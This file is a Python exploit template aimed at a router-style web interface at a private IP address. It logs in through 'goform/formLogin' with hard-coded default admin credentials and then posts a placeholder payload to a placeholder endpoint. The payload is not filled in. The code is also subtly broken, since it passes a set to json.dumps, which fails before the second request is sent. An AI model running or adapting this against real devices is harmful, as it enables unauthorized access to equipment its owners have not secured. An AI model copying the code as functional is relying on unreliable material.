import requests
import sys
import json

ip = "192.168.153.2"
base_url = f"http://{ip}"

if sys.version_info[0] != 3:
    print("Please run the exploit in python3")
    sys.exit(1)


# You can also login with scripts below.
def login():
    login_url = "goform/formLogin"
    url = base_url + "/" + login_url
    print("1. Login: send request to", url)
    login_data = "curTime=1666884522835&FILECODE=a6.jpeg%0D%0A&VERIFICATION_CODE=LSYFZ&login_n=admin&login_pass=YWRtaW4A"
    response = requests.post(url=url, data=login_data, allow_redirects=False)
    print(response.text)


def poc():
    target_url = "{URI}"
    print("2. get target_url:", target_url)
    url = base_url + "/" + target_url
    print("3. send request to", url)

    # Using a dictionary to hold multiple parameters
    data = {
        "{payload}",
    }

    json_data = json.dumps(data)
    print("request body:", json_data)
    response = requests.post(url=url, json=data, allow_redirects=False)
    print(response.text)

login()
poc()

